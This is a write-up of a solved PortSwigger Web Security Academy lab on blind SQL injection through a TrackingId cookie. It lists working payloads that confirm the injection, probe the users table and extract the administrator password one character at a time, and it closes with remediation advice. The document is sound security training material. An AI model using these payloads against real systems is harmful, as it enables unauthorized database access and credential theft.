# Blind SQL Injection with Conditional Responses

* **Platform:** PortSwigger Web Security Academy
* **Difficulty:** Practitioner
* **Category:** SQL Injection — Blind SQL Injection
* **Status:** Solved
* **Tool:** Burp Suite

## Objective

Exploit a blind SQL injection vulnerability in the `TrackingId` cookie to retrieve the administrator's password and log in as the administrator.

## Methodology

1. Intercepted the application request using Burp Suite and identified the `TrackingId` cookie as the injection point.
2. Confirmed the SQL injection vulnerability using a TRUE condition and observed the `Welcome back` message.
3. Confirmed the existence of the `users` table using a conditional SQL query.
4. Verified the administrator account and determined that its password contained multiple characters.
5. Used the `SUBSTRING()` function to extract the administrator's password one character at a time by testing TRUE/FALSE conditions.
6. Reconstructed the complete password and successfully logged in as the administrator.

## Payloads

**Confirm SQL injection:**

```sql
' AND 1=1--
```

**Confirm the users table exists:**

```sql
' AND (SELECT 'x' FROM users LIMIT 1)='x'--
```

**Identify the administrator account:**

```sql
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--
```

**Extract password characters:**

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

Repeated the final payload while changing the character position and testing different characters.

**Extracted Password:**

```text
1vp254ggxtnmqq3ngrr0
```

## Vulnerability

The application incorporated the `TrackingId` cookie value into an SQL query without adequate protection, allowing SQL injection through user-controlled input.

## Impact

An attacker could exploit conditional responses to extract sensitive database information, including administrator credentials, character by character.

## Remediation

* Use parameterized queries (prepared statements).
* Avoid concatenating untrusted input into SQL statements.
* Validate and handle cookie values securely.
* Apply least-privilege database permissions.
* Store passwords using strong, salted password hashes.

## Evidence

<img width="1212" height="880" alt="image" src="https://github.com/user-attachments/assets/9dd8cb1c-40e0-4007-8008-b066c87e2d92" />
<img width="1735" height="332" alt="image" src="https://github.com/user-attachments/assets/e47eda54-bf1d-448e-8a16-1d60234525cd" />

